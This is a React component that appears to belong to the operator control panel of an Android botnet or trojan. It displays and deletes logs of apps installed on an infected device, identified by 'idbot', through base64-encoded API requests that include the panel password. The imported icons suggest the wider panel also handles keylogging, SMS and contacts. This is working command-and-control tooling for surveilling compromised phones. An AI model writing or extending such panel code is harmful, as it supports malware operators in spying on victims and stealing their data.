import React, { useState, useEffect, useRef } from 'react'
import SettingsContext from 'src/settings';
import NextLink from 'next/link';
import { Dialog, Box, Switch, Tooltip,ListItemAvatar, Avatar, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText} from '@mui/material';
import XCircleIcon from '@heroicons/react/24/solid/XCircleIcon';
import UserIcon from '@heroicons/react/24/solid/UserCircleIcon';
import Globe from '@heroicons/react/24/solid/GlobeEuropeAfricaIcon';
import Battery from '@heroicons/react/24/solid/Battery100Icon';
import { func } from 'prop-types';
import axios from "axios";
import $ from 'jquery';
import { Svg } from "react-svg";
import cheerio from "cheerio";

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faRectangleList, faArrowsRotate, faTrashCan } from '@fortawesome/free-solid-svg-icons';
import countryData from './countrydata.json';
import { borderRadius } from '@mui/system';


export default function AppsPopup(props) {


    const { customer, title, children, openPopup, setOpenPopup, onClose, apprequest, setapprequest} = props;


    const [list, setList] = useState([]);

    var requestdone = false
    const buttoncolor = "primary.main"

    const rootStyle = {
        display: 'flex',
        flexDirection: 'column',
        padding: '25px',
    };

    const smallBoxStyle = {
        marginBottom: '25px'
    };

    const tworoundstyle = {
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
    };

      const getLogs = async () => {
        let request = $.ajax({
          type: 'POST',
          url: SettingsContext.restApiUrl,
          data: {
              'params':  new Buffer ('{"request":"getlogsListApplications","idbot":"' + customer.id + '","password":"' + SettingsContext.password + ' "}').toString('base64')
          }
        });
    
        request.done(function(msg) {
          let response = (JSON.parse(msg))
          
          setList(response)
          
        }.bind(this));
    
        
      };

      const deleteLogs = async () => {
        let request = $.ajax({
          type: 'POST',
          url: SettingsContext.restApiUrl,
          data: {
              'params':  new Buffer ('{"request":"dellogsListApplications","idbot":"' + customer.id + '","password":"' + SettingsContext.password + ' "}').toString('base64')
          }
        });

        setList([])
        
      };

      if (openPopup && !apprequest) {
        getLogs()
        setapprequest(true)
      }



    
    return (
        
        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth="md">
            <DialogContent dividers>
                    <div style={{ display: "flex", justifyContent: "space-between"}}>
                    <Box
                    bgcolor={buttoncolor}
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={220}
                >
                    <SvgIcon fontSize="medium">
                          <UserIcon width={20} height={23}/> 
                        </SvgIcon>
                        <Typography ml={0.5}>{customer.id}</Typography>
                        
                    </Box>

                    <Box
                    bgcolor={buttoncolor}
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={180}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faRectangleList}/>
                        </SvgIcon>
                        <Typography ml={1}>Installed Apps</Typography>
                        
                    </Box>
                    
                    <Button
                    onClick={getLogs}
                      sx={{borderRadius: "10px"}}
                      startIcon={(
                        <FontAwesomeIcon icon={faArrowsRotate} />
                      )}
                      variant="contained"
                    >
                      Reload
                    </Button>

                    <Button
                    disabled={SettingsContext.user.role === "user"}
                    onClick={deleteLogs}
                    sx={{borderRadius: "10px", marginLeft: "15px"}}
                      startIcon={(
                        <FontAwesomeIcon icon={faTrashCan} />
                      )}
                      variant="contained"
                    >
                      Delete Log
                    </Button>

                    <Button
                        onClick={()=>{setOpenPopup(false)}}>
                        <FontAwesomeIcon icon={faXmarkSquare} size="2x" color={buttoncolor}/>
                    </Button>
                    </div>
                    {list.length > 0 ? (
                    <List>
                    {list.map((item, index) => (
                        <ListItem key={item}>
                        <ListItemAvatar>
                            <Avatar><SvgIcon>
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M325.3 234.3L104.6 13l280.8 161.2-60.1 60.1zM47 0C34 6.8 25.3 19.2 25.3 35.3v441.3c0 16.1 8.7 28.5 21.7 35.3l256.6-256L47 0zm425.2 225.6l-58.9-34.1-65.7 64.5 65.7 64.5 60.1-34.1c18-14.3 18-46.5-1.2-60.8zM104.6 499l280.8-161.2-60.1-60.1L104.6 499z"/></svg>
                            </SvgIcon></Avatar>
                        </ListItemAvatar>
                        <ListItemText primary={atob(item)} secondary={""} />
                        </ListItem>
                    ))}
                    </List>
                    ) : (
                        <p>No data avaliable.</p>
                    )}

            </DialogContent>
        </Dialog>
    )
}
